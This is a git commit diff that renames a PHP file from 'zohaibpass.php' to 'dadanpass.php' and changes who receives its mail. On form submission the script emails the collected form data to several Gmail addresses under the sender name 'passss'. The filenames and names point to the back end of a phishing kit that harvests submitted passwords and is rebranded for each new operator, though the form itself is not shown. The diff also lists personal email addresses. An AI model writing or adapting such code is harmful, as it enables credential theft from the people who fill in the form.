7f10a2bf8a96070607098de82f0742fbd89bced3
contentemmaronnie <content.emmaronnie.ads@gmail.com>
2025-07-10 00:29:18 +0500

    Update and rename zohaibpass.php to dadanpass.php

--- dadanpass.php
+++ dadanpass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('aliumair0044@gmail.com', 'passss');
-        $mail->addAddress('kameronjustine234@gmail.com');
+        $mail->addAddress('adsright680@gmail.com');
         $mail->addAddress('aliumair0044@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Zohaib';
+        $mail->Subject = 'Dadan';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
